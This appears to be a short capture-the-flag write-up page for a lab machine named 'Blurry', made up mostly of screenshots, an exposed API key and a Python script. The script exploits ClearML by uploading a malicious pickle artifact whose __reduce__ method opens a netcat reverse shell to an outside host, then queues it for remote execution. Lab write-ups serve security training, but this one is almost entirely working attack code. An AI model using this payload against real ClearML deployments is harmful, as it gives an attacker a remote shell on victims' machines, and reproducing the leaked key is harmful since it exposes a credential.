---
description: Linux | medium
---

# Blurry

10.129.3.154

<figure><img src="../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

clef api : HGLEWII6D6U1Q245DJQL

<figure><img src="../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

```python
import os
from clearml import Task
import base64
import time

task = Task.init(project_name='Black Swan', task_name='pickle', tags=["review"], task_type=Task.TaskTypes.data_processing)

class Pickle:
    def __reduce__(self):
        cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.111 4444 >/tmp/f"
        return os.system, (cmd,)

rng_name = base64.b64encode(str(time.time()).encode()).decode()
task.upload_artifact(name=rng_name, artifact_object=Pickle())

task.execute_remotely(queue_name='default')
```
